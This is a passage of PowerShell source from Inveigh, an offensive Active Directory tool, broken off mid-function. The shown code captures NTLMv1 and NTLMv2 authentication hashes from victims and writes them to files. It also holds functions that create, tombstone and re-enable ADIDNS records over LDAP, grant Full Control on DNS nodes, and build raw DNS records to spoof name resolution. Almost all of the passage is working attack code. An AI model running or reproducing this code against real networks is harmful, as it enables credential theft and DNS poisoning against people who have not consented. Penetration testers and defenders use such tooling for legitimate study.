}\n\n                    }\n                    else\n                    {\n                        $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 ignored for $NTLM_domain_string\\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[capture disabled]\") > $null    \n                    }\n\n                }\n                else\n                {\n                    $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 challenge missing for $NTLM_domain_string\\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort\") > $null    \n                }\n\n            }\n            elseif($NTLM_length -eq 24)\n            {\n\n                if($NTLM_challenge)\n                {\n\n                    $NTLMv1_hash = $NTLM_user_string + \"::\" + $NTLM_domain_string + \":\" + $LM_response + \":\" + $NTLM_response + \":\" + $NTLM_challenge\n\n                    if($Capture -eq 'Y')\n                    {\n\n                        if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))\n                        {\n                            $inveigh.NTLMv1_list.Add($NTLMv1_hash) > $null\n\n                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains \"$SourceIP $NTLM_domain_string\\$NTLM_user_string\"))\n                            {\n                                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 captured for $NTLM_domain_string\\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:\") > $null\n                                $inveigh.output_queue.Add($NTLMv1_hash) > $null\n                            }\n                            else\n                            {\n                                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 captured for $NTLM_domain_string\\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[not unique]\") > $null\n                            }\n\n                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains \"$SourceIP $NTLM_domain_string\\$NTLM_user_string\")))\n                            {\n                                $inveigh.NTLMv1_file_queue.Add($NTLMv1_hash) > $null\n                                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] SMB($Port) NTLMv1 written to \" + \"Inveigh-NTLMv1.txt\") > $null\n                            }\n\n                            if($inveigh.NTLMv1_username_list -notcontains \"$SourceIP $NTLM_domain_string\\$NTLM_user_string\")\n                            {\n                                $inveigh.NTLMv1_username_list.Add(\"$SourceIP $NTLM_domain_string\\$NTLM_user_string\") > $null\n                            }\n\n                            if($inveigh.IP_capture_list -notcontains $SourceIP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $SourceIP -ne $IP)\n                            {\n                                $inveigh.IP_capture_list.Add($SourceIP) > $null\n                            }\n\n                        }\n                        else\n                        {\n                            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv1 ignored for $NTLM_domain_string\\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[machine account]\") > $null    \n                        }\n\n                    }\n                    else\n                    {\n                        $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv1 ignored for $NTLM_domain_string\\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[capture disabled]\") > $null    \n                    }\n\n                }\n                else\n                {\n                    $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] $Protocol($Port) NTLMv1 challenge missing for $NTLM_domain_string\\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort\") > $null    \n                }\n\n            }\n            elseif($NTLM_length -eq 0)\n            {\n                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $Protocol($Port) NTLM null response from $SourceIP($NTLM_host_string)`:$SourcePort\") > $null\n            }\n\n            Invoke-SessionUpdate $NTLM_domain_string $NTLM_user_string $NTLM_host_string $source_IP\n        }\n\n    }\n\n}\n\n# ADIDNS Functions ScriptBlock\n$ADIDNS_functions_scriptblock =\n{\n\n    function Disable-ADIDNSNode\n    {\n\n        [CmdletBinding()]\n        param\n        (\n            [parameter(Mandatory=$false)][String]$Domain,\n            [parameter(Mandatory=$false)][String]$DomainController,\n            [parameter(Mandatory=$true)][String]$Node,\n            [parameter(Mandatory=$false)][ValidateSet(\"DomainDNSZones\",\"ForestDNSZones\")][String]$Partition = \"DomainDNSZones\",\n            [parameter(Mandatory=$false)][String]$Zone,\n            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential\n        )\n\n        $SOASerialNumberArray = New-SOASerialNumberArray -DomainController $DomainController -Zone $Zone\n\n        $distinguished_name = \"DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition\"\n        $DC_array = $Domain.Split(\".\")\n\n        foreach($DC in $DC_array)\n        {\n            $distinguished_name += \",DC=$DC\"\n        }\n\n        if($Credential)\n        {\n            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$DomainController/$distinguished_name\",$Credential.UserName,$Credential.GetNetworkCredential().Password)\n        }\n        else\n        {\n            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry \"LDAP://$DomainController/$distinguished_name\"\n        }\n\n        $timestamp = [Int64](([datetime]::UtcNow.Ticks)-(Get-Date \"1/1/1601\").Ticks)\n        $timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($timestamp))\n        $timestamp = $timestamp.Split(\"-\") | ForEach-Object{[System.Convert]::ToInt16($_,16)}\n\n        [Byte[]]$DNS_record = 0x08,0x00,0x00,0x00,0x05,0x00,0x00,0x00 +\n            $SOASerialNumberArray[0..3] +\n            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +\n            $timestamp\n\n        try\n        {\n            $directory_entry.InvokeSet('dnsRecord',$DNS_record)\n            $directory_entry.InvokeSet('dnsTombstoned',$true)\n            $directory_entry.SetInfo()\n            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] ADIDNS node $Node tombstoned in $Zone\") > $null\n        }\n        catch\n        {\n            $error_message = $_.Exception.Message\n            $error_message = $error_message -replace \"`n\",\"\"\n            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n        }\n\n        if($directory_entry.Path)\n        {\n            $directory_entry.Close()\n        }\n\n    }\n\n    function Enable-ADIDNSNode\n    {\n\n        [CmdletBinding()]\n        param\n        (\n            [parameter(Mandatory=$false)][String]$Data,    \n            [parameter(Mandatory=$false)][String]$DistinguishedName,\n            [parameter(Mandatory=$false)][String]$Domain,\n            [parameter(Mandatory=$false)][String]$DomainController,\n            [parameter(Mandatory=$true)][String]$Node,\n            [parameter(Mandatory=$false)][ValidateSet(\"DomainDNSZones\",\"ForestDNSZones\")][String]$Partition = \"DomainDNSZones\",\n            [parameter(Mandatory=$false)][ValidateSet(\"A\",\"AAAA\",\"CNAME\",\"DNAME\",\"MX\",\"NS\",\"PTR\",\"SRV\",\"TXT\")][String]$Type = \"A\",\n            [parameter(Mandatory=$false)][String]$Zone,\n            [parameter(Mandatory=$false)][Byte[]]$DNSRecord,\n            [parameter(Mandatory=$false)][Int]$Preference,\n            [parameter(Mandatory=$false)][Int]$Priority,\n            [parameter(Mandatory=$false)][Int]$Weight,\n            [parameter(Mandatory=$false)][Int]$Port,\n            [parameter(Mandatory=$false)][Int]$TTL = 600,\n            [parameter(Mandatory=$false)][Int32]$SOASerialNumber,\n            [parameter(Mandatory=$false)][Switch]$Static,\n            [parameter(Mandatory=$false)][Switch]$Tombstone,\n            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential\n        )\n\n        $distinguished_name = \"DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition\"\n        $DC_array = $Domain.Split(\".\")\n\n        foreach($DC in $DC_array)\n        {\n            $distinguished_name += \",DC=$DC\"\n        }\n\n        [Byte[]]$DNSRecord = New-DNSRecordArray -Data $Data -DomainController $DomainController -Type $Type -TTL $TTL -Zone $Zone\n\n        if($Credential)\n        {\n            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$DomainController/$distinguished_name\",$Credential.UserName,$Credential.GetNetworkCredential().Password)\n        }\n        else\n        {\n            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry \"LDAP://$DomainController/$distinguished_name\"\n        }\n\n        try\n        {\n            $directory_entry.InvokeSet('dnsRecord',$DNSRecord)\n            $directory_entry.SetInfo()\n            $success = $true\n            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] ADIDNS node $Node added to $Zone\") > $null;\n            $inveigh.ADIDNS_table.$Node = \"1\"\n        }\n        catch\n        {\n            $success = $false\n            $error_message = $_.Exception.Message\n            $error_message = $error_message -replace \"`n\",\"\"\n            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n            $inveigh.ADIDNS_table.$Node = \"0\"\n        }\n\n        if($directory_entry.Path)\n        {\n            $directory_entry.Close()\n        }\n\n        return $success\n    }\n\n    function Get-ADIDNSNodeTombstoned\n    {\n\n        [CmdletBinding()]\n        param\n        (\n            [parameter(Mandatory=$false)][String]$DistinguishedName,\n            [parameter(Mandatory=$false)][String]$Domain,\n            [parameter(Mandatory=$false)][String]$DomainController,\n            [parameter(Mandatory=$true)][String]$Node,\n            [parameter(Mandatory=$false)][ValidateSet(\"DomainDNSZones\",\"ForestDNSZones\")][String]$Partition = \"DomainDNSZones\",\n            [parameter(Mandatory=$false)][String]$Zone,\n            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential\n        )\n\n        $distinguished_name = \"DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition\"\n        $DC_array = $Domain.Split(\".\")\n\n        foreach($DC in $DC_array)\n        {\n            $distinguished_name += \",DC=$DC\"\n        }\n\n        if($Credential)\n        {\n            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$DomainController/$distinguished_name\",$Credential.UserName,$Credential.GetNetworkCredential().Password)\n        }\n        else\n        {\n            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry \"LDAP://$DomainController/$distinguished_name\"\n        }\n\n        try\n        {\n            $dnsTombstoned = $directory_entry.InvokeGet('dnsTombstoned')\n            $dnsRecord = $directory_entry.InvokeGet('dnsRecord')\n        }\n        catch\n        {\n\n            if($_.Exception.Message -notlike '*Exception calling \"InvokeGet\" with \"1\" argument(s): \"The specified directory service attribute or value does not exist.*' -and\n            $_.Exception.Message -notlike '*The following exception occurred while retrieving member \"InvokeGet\": \"The specified directory service attribute or value does not exist.*')\n            {\n                $error_message = $_.Exception.Message\n                $error_message = $error_message -replace \"`n\",\"\"\n                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n            }\n\n        }\n\n        if($directory_entry.Path)\n        {\n            $directory_entry.Close()\n        }\n\n        $node_tombstoned = $false\n\n        if($dnsTombstoned -and $dnsRecord)\n        {\n\n            if($dnsRecord[0].GetType().name -eq [Byte])\n            {\n\n                if($dnsRecord.Count -ge 32 -and $dnsRecord[2] -eq 0)\n                {\n                    $node_tombstoned = $true\n                }\n\n            }\n\n        }\n\n        return $node_tombstoned\n    }\n\n    function Grant-ADIDNSPermission\n    {\n        [CmdletBinding()]\n        param\n        (\n            [parameter(Mandatory=$false)][ValidateSet(\"AccessSystemSecurity\",\"CreateChild\",\"Delete\",\"DeleteChild\",\n            \"DeleteTree\",\"ExtendedRight\",\"GenericAll\",\"GenericExecute\",\"GenericRead\",\"GenericWrite\",\"ListChildren\",\n            \"ListObject\",\"ReadControl\",\"ReadProperty\",\"Self\",\"Synchronize\",\"WriteDacl\",\"WriteOwner\",\"WriteProperty\")][Array]$Access = \"GenericAll\",\n            [parameter(Mandatory=$false)][ValidateSet(\"Allow\",\"Deny\")][String]$Type = \"Allow\",    \n            [parameter(Mandatory=$false)][String]$DistinguishedName,\n            [parameter(Mandatory=$false)][String]$Domain,\n            [parameter(Mandatory=$false)][String]$DomainController,\n            [parameter(Mandatory=$false)][String]$Node,\n            [parameter(Mandatory=$false)][ValidateSet(\"DomainDNSZones\",\"ForestDNSZones\",\"System\")][String]$Partition = \"DomainDNSZones\",\n            [parameter(Mandatory=$false)][String]$Principal,\n            [parameter(Mandatory=$false)][String]$Zone,\n            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,\n            [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter\n        )\n\n        if($Partition -eq 'System')\n        {\n            $distinguished_name = \"DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$Partition\"\n        }\n        else\n        {\n            $distinguished_name = \"DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition\"\n        }\n\n        $DC_array = $Domain.Split(\".\")\n\n        ForEach($DC in $DC_array)\n        {\n            $distinguished_name += \",DC=$DC\"\n        }\n\n        if($Credential)\n        {\n            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$DomainController/$distinguished_name\",$Credential.UserName,$Credential.GetNetworkCredential().Password)\n        }\n        else\n        {\n            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry \"LDAP://$DomainController/$distinguished_name\"\n        }\n\n        try\n        {\n            $NT_account = New-Object System.Security.Principal.NTAccount($Principal)\n            $principal_SID = $NT_account.Translate([System.Security.Principal.SecurityIdentifier])\n            $principal_identity = [System.Security.Principal.IdentityReference]$principal_SID\n            $AD_rights = [System.DirectoryServices.ActiveDirectoryRights]$Access\n            $access_control_type = [System.Security.AccessControl.AccessControlType]$Type\n            $AD_security_inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]\"All\"\n            $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($principal_identity,$AD_rights,$access_control_type,$AD_security_inheritance)\n        }\n        catch\n        {\n            $error_message = $_.Exception.Message\n            $error_message = $error_message -replace \"`n\",\"\"\n            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n        }\n\n        try\n        {\n            $directory_entry.psbase.ObjectSecurity.AddAccessRule($ACE)\n            $directory_entry.psbase.CommitChanges()\n            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Full Control ACE added for $Principal to $Node DACL\") > $null\n        }\n        catch\n        {\n            $error_message = $_.Exception.Message\n            $error_message = $error_message -replace \"`n\",\"\"\n            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n        }\n\n        if($directory_entry.Path)\n        {\n            $directory_entry.Close()\n        }\n\n        return $output\n    }\n    \n    function New-ADIDNSNode\n    {\n        [CmdletBinding()]\n        param\n        (\n            [parameter(Mandatory=$false)][String]$Data,    \n            [parameter(Mandatory=$false)][String]$DistinguishedName,\n            [parameter(Mandatory=$false)][String]$Domain,\n            [parameter(Mandatory=$false)][String]$DomainController,\n            [parameter(Mandatory=$false)][String]$Forest,\n            [parameter(Mandatory=$true)][String]$Node,\n            [parameter(Mandatory=$false)][ValidateSet(\"DomainDNSZones\",\"ForestDNSZones\")][String]$Partition = \"DomainDNSZones\",\n            [parameter(Mandatory=$false)][String]$Type,\n            [parameter(Mandatory=$false)][String]$Zone,\n            [parameter(Mandatory=$false)][Int]$TTL,\n            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential\n        )\n\n        $null = [System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\")\n\n        $distinguished_name = \"DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition\"\n        $DC_array = $Domain.Split(\".\")\n\n        foreach($DC in $DC_array)\n        {\n            $distinguished_name += \",DC=$DC\"\n        }\n\n        [Byte[]]$DNSRecord = New-DNSRecordArray -Data $Data -DomainController $DomainController -Type $Type -TTL $TTL -Zone $Zone\n        $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($DomainController,389)\n\n        if($Credential)\n        {\n            $connection = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier,$Credential.GetNetworkCredential())\n        }\n        else\n        {\n            $connection = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier)\n        }\n\n        $object_category = \"CN=Dns-Node,CN=Schema,CN=Configuration\"\n        $forest_array = $Forest.Split(\".\")\n\n        foreach($DC in $forest_array)\n        {\n            $object_category += \",DC=$DC\"\n        }\n        \n        try\n        {\n            $connection.SessionOptions.Sealing = $true\n            $connection.SessionOptions.Signing = $true\n            $connection.Bind()\n            $request = New-Object -TypeName System.DirectoryServices.Protocols.AddRequest\n            $request.DistinguishedName = $distinguished_name\n            $request.Attributes.Add((New-Object \"System.DirectoryServices.Protocols.DirectoryAttribute\" -ArgumentList \"objectClass\",@(\"top\",\"dnsNode\"))) > $null\n            $request.Attributes.Add((New-Object \"System.DirectoryServices.Protocols.DirectoryAttribute\" -ArgumentList \"objectCategory\",$object_category)) > $null\n            $request.Attributes.Add((New-Object \"System.DirectoryServices.Protocols.DirectoryAttribute\" -ArgumentList \"dnsRecord\",$DNSRecord)) > $null\n            $request.Attributes.Add((New-Object \"System.DirectoryServices.Protocols.DirectoryAttribute\" -ArgumentList \"dNSTombstoned\",\"TRUE\")) > $null\n            $connection.SendRequest($request) > $null\n            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] ADIDNS node $Node type $Type added to $Zone\") > $null\n            $output = $true\n            $inveigh.ADIDNS_table.$Node = \"1\"\n        }\n        catch\n        {\n            $error_message = $_.Exception.Message\n            $error_message = $error_message -replace \"`n\",\"\"\n            $output = $false\n\n            if($_.Exception.Message -ne 'Exception calling \"SendRequest\" with \"1\" argument(s): \"The object exists.\"')\n            {\n                $inveigh.ADIDNS = $null\n                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n                $inveigh.ADIDNS_table.$Node = \"0\"\n            }\n\n        }\n\n        return $output\n    }\n\n    function New-SOASerialNumberArray\n    {\n\n        [CmdletBinding()]\n        param\n        (\n            [parameter(Mandatory=$false)][String]$DomainController,\n            [parameter(Mandatory=$false)][String]$Zone\n        )\n\n        $Zone = $Zone.ToLower()\n\n        function Convert-DataToUInt16($Field)\n        {\n            [Array]::Reverse($Field)\n            return [System.BitConverter]::ToUInt16($Field,0)\n        }\n\n        function ConvertFrom-PacketOrderedDictionary($OrderedDictionary)\n        {\n\n            foreach($field in $OrderedDictionary.Values)\n            {\n                $byte_array += $field\n            }\n\n            return $byte_array\n        }\n\n        function New-RandomByteArray\n        {\n            param([Int]$Length,[Int]$Minimum=1,[Int]$Maximum=255)\n\n            [String]$random = [String](1..$Length | ForEach-Object {\"{0:X2}\" -f (Get-Random -Minimum $Minimum -Maximum $Maximum)})\n            [Byte[]]$random = $random.Split(\" \") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n\n            return $random\n        }\n\n        function New-DNSNameArray\n        {\n            param([String]$Name)\n\n            $character_array = $Name.ToCharArray()\n            [Array]$index_array = 0..($character_array.Count - 1) | Where-Object {$character_array[$_] -eq '.'}\n\n            if($index_array.Count -gt 0)\n            {\n\n                $name_start = 0\n\n                foreach($index in $index_array)\n                {\n                    $name_end = $index - $name_start\n                    [Byte[]]$name_array += $name_end\n                    [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start,$name_end))\n                    $name_start = $index + 1\n                }\n\n                [Byte[]]$name_array += ($Name.Length - $name_start)\n                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))\n            }\n            else\n            {\n                [Byte[]]$name_array = $Name.Length\n                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))\n            }\n\n            return $name_array\n        }\n\n        function New-PacketDNSSOAQuery\n        {\n            param([String]$Name)\n\n            [Byte[]]$type = 0x00,0x06\n            [Byte[]]$name = (New-DNSNameArray $Name) + 0x00\n            [Byte[]]$length = [System.BitConverter]::GetBytes($Name.Count + 16)[1,0]\n            [Byte[]]$transaction_ID = New-RandomByteArray 2\n            $DNSQuery = New-Object System.Collections.Specialized.OrderedDictionary\n            $DNSQuery.Add(\"Length\",$length)\n            $DNSQuery.Add(\"TransactionID\",$transaction_ID)\n            $DNSQuery.Add(\"Flags\",[Byte[]](0x01,0x00))\n            $DNSQuery.Add(\"Questions\",[Byte[]](0x00,0x01))\n            $DNSQuery.Add(\"AnswerRRs\",[Byte[]](0x00,0x00))\n            $DNSQuery.Add(\"AuthorityRRs\",[Byte[]](0x00,0x00))\n            $DNSQuery.Add(\"AdditionalRRs\",[Byte[]](0x00,0x00))\n            $DNSQuery.Add(\"Queries_Name\",$name)\n            $DNSQuery.Add(\"Queries_Type\",$type)\n            $DNSQuery.Add(\"Queries_Class\",[Byte[]](0x00,0x01))\n\n            return $DNSQuery\n        }\n\n        $DNS_client = New-Object System.Net.Sockets.TCPClient\n        $DNS_client.Client.ReceiveTimeout = 3000\n\n        try\n        {\n            $DNS_client.Connect($DomainController,\"53\")\n            $DNS_client_stream = $DNS_client.GetStream()\n            $DNS_client_receive = New-Object System.Byte[] 2048\n            $packet_DNSQuery = New-PacketDNSSOAQuery $Zone\n            [Byte[]]$DNS_client_send = ConvertFrom-PacketOrderedDictionary $packet_DNSQuery\n            $DNS_client_stream.Write($DNS_client_send,0,$DNS_client_send.Length) > $null\n            $DNS_client_stream.Flush()   \n            $DNS_client_stream.Read($DNS_client_receive,0,$DNS_client_receive.Length) > $null\n            $DNS_client.Close()\n            $DNS_client_stream.Close()\n\n            if($DNS_client_receive[9] -eq 0)\n            {\n                $inveigh.output_queue.Add(\"[-] $Zone SOA record not found\") > $null\n            }\n            else\n            {\n                $DNS_reply_converted = [System.BitConverter]::ToString($DNS_client_receive)\n                $DNS_reply_converted = $DNS_reply_converted -replace \"-\",\"\"\n                $SOA_answer_index = $DNS_reply_converted.IndexOf(\"C00C00060001\")\n                $SOA_answer_index = $SOA_answer_index / 2\n                $SOA_length = $DNS_client_receive[($SOA_answer_index + 10)..($SOA_answer_index + 11)]\n                $SOA_length = Convert-DataToUInt16 $SOA_length\n                [Byte[]]$SOA_serial_current_array = $DNS_client_receive[($SOA_answer_index + $SOA_length - 8)..($SOA_answer_index + $SOA_length - 5)]\n                $SOA_serial_current = [System.BitConverter]::ToUInt32($SOA_serial_current_array[3..0],0) + 1\n                [Byte[]]$SOA_serial_number_array = [System.BitConverter]::GetBytes($SOA_serial_current)[0..3]\n            }\n\n        }\n        catch\n        {\n            $inveigh.output_queue.Add(\"[-] $DomainController did not respond on TCP port 53\") > $null\n        }\n\n        return [Byte[]]$SOA_serial_number_array\n    }\n\n    function New-DNSRecordArray\n    {\n        [CmdletBinding()]\n        [OutputType([Byte[]])]\n        param\n        (\n            [parameter(Mandatory=$false)][String]$Data,\n            [parameter(Mandatory=$false)][String]$DomainController,\n            [parameter(Mandatory=$false)][ValidateSet(\"A\",\"AAAA\",\"CNAME\",\"DNAME\",\"MX\",\"NS\",\"PTR\",\"SRV\",\"TXT\")][String]$Type = \"A\",\n            [parameter(Mandatory=$false)][String]$Zone,\n            [parameter(Mandatory=$false)][Int]$Preference,\n            [parameter(Mandatory=$false)][Int]$Priority,\n            [parameter(Mandatory=$false)][Int]$Weight,\n            [parameter(Mandatory=$false)][Int]$Port,\n            [parameter(Mandatory=$false)][Int]$TTL = 600,\n            [parameter(Mandatory=$false)][Int32]$SOASerialNumber,\n            [parameter(Mandatory=$false)][Switch]$Static,\n            [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter\n        )\n\n        $SOASerialNumberArray = New-SOASerialNumberArray -DomainController $DomainController -Zone $Zone\n\n        function New-DNSNameArray\n        {\n            param([String]$Name)\n\n            $character_array = $Name.ToCharArray()\n            [Array]$index_array = 0..($character_array.Count - 1) | Where-Object {$character_array[$_] -eq '.'}\n\n            if($index_array.Count -gt 0)\n            {\n\n                $name_start = 0\n\n                foreach($index in $index_array)\n                {\n                    $name_end = $index - $name_start\n                    [Byte[]]$name_array += $name_end\n                    [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start,$name_end))\n                    $name_start = $index + 1\n                }\n\n                [Byte[]]$name_array += ($Name.Length - $name_start)\n                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))\n            }\n            else\n            {\n                [Byte[]]$name_array = $Name.Length\n                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))\n            }\n\n            return $name_array\n        }\n\n        switch ($Type)\n        {\n\n            'A'\n            {\n                [Byte[]]$DNS_type = 0x01,0x00\n                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes(($Data.Split(\".\")).Count))[0..1]\n                [Byte[]]$DNS_data += ([System.Net.IPAddress][String]([System.Net.IPAddress]$Data)).GetAddressBytes()\n            }\n\n            'AAAA'\n            {\n                [Byte[]]$DNS_type = 0x1c,0x00\n                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes(($Data -replace \":\",\"\").Length / 2))[0..1]\n                [Byte[]]$DNS_data += ([System.Net.IPAddress][String]([System.Net.IPAddress]$Data)).GetAddressBytes()\n            }\n            \n            'CNAME'\n            {\n                [Byte[]]$DNS_type = 0x05,0x00\n                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes($Data.Length + 4))[0..1]\n                [Byte[]]$DNS_data = $Data.Length + 2\n                $DNS_data += ($Data.Split(\".\")).Count\n                $DNS_data += New-DNSNameArray $Data\n                $DNS_data += 0x00\n            }\n\n            'DNAME'\n            {\n                [Byte[]]$DNS_type = 0x27,0x00\n                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes($Data.Length + 4))[0..1]\n                [Byte[]]$DNS_data = $Data.Length + 2\n                $DNS_data += ($Data.Split(\".\")).Count\n                $DNS_data += New-DNSNameArray $Data\n                $DNS_data += 0x00\n            }\n            \n            'MX'\n            {\n                [Byte[]]$DNS_type = 0x0f,0x00\n                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes($Data.Length + 6))[0..1]\n                [Byte[]]$DNS_data = [System.Bitconverter]::GetBytes($Preference)[1,0]\n                $DNS_data += $Data.Length + 2\n                $DNS_data += ($Data.Split(\".\")).Count\n                $DNS_data += New-DNSNameArray $Data\n                $DNS_data += 0x00\n            }\n\n            'NS'\n            {\n                [Byte[]]$DNS_type = 0x02,0x00\n                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes($Data.Length + 4))[0..1]\n                [Byte[]]$DNS_data = $Data.Length + 2\n                $DNS_data += ($Data.Split(\".\")).Count\n                $DNS_data += New-DNSNameArray $Data\n                $DNS_data += 0x00\n            }\n\n            'PTR'\n            {\n                [Byte[]]$DNS_type = 0x0c,0x00\n                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes($Data.Length + 4))[0..1]\n                [Byte[]]$DNS_data = $Data.Length + 2\n                $DNS_data += ($Data.Split(\".\")).Count\n                $DNS_data += New-DNSNameArray $Data\n                $DNS_data += 0x00\n            }\n\n            'SRV'\n            {\n                [Byte[]]$DNS_type = 0x21,0x00\n                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes($Data.Length + 10))[0..1]\n                [Byte[]]$DNS_data = [System.Bitconverter]::GetBytes($Priority)[1,0]\n                $DNS_data += [System.Bitconverter]::GetBytes($Weight)[1,0]\n                $DNS_data += [System.Bitconverter]::GetBytes($Port)[1,0]\n                $DNS_data += $Data.Length + 2\n                $DNS_data += ($Data.Split(\".\")).Count\n                $DNS_data += New-DNSNameArray $Data\n                $DNS_data += 0x00\n            }\n\n            'TXT'\n            {\n                [Byte[]]$DNS_type = 0x10,0x00\n                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes($Data.Length + 1))[0..1]\n                [Byte[]]$DNS_data = $Data.Length\n                $DNS_data += [System.Text.Encoding]::UTF8.GetBytes($Data)\n            }\n\n        }\n        \n        [Byte[]]$DNS_TTL = [System.BitConverter]::GetBytes($TTL)\n        [Byte[]]$DNS_record = $DNS_length +\n            $DNS_type +\n            0x05,0xF0,0x00,0x00 +\n            $SOASerialNumberArray[0..3] +\n            $DNS_TTL[3..0] +\n            0x00,0x00,0x00,0x00\n\n        if($Static)\n        {\n            $DNS_record += 0x00,0x00,0x00,0x00\n        }\n        else\n        {\n            $timestamp = [Int64](([Datetime]::UtcNow)-(Get-Date \"1/1/1601\")).TotalHours\n            $timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($timestamp))\n            $timestamp = $timestamp.Split(\"-\") | ForEach-Object{[System.Convert]::ToInt16($_,16)}\n            $timestamp = $timestamp[0..3]\n            $DNS_record += $timestamp\n        }\n        \n        $DNS_record += $DNS_data\n\n        return ,$DNS_record\n    }\n\n    function Invoke-ADIDNSSpoofer\n    {\n        [CmdletBinding()]\n        param\n        (\n            [parameter(Mandatory=$false)][String]$Data,\n            [parameter(Mandatory=$false)][String]$Domain,\n            [parameter(Mandatory=$false)][String]$DomainController,\n            [parameter(Mandatory=$false)][String]$Forest,\n            [parameter(Mandatory=$true)][String]$Node,\n            [parameter(Mandatory=$false)][String]$Partition,\n            [parameter(Mandatory=$false)][String]$Type,\n            [parameter(Mandatory=$false)][String]$Zone,\n            [parameter(Mandatory=$false)][Int]$TTL,\n            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential\n        )\n\n        try\n        {\n            $node_added = New-ADIDNSNode -Credential $Credential -Data $Data -Domain $Domain -DomainController $DomainController -Forest $Forest -Node $Node -Partition $Partition -Type $Type -TTL $TTL -Zone $Zone\n\n            if($inveigh.ADIDNS -and !$node_added)\n            {\n                $node_tombstoned = Get-ADIDNSNodeTombstoned 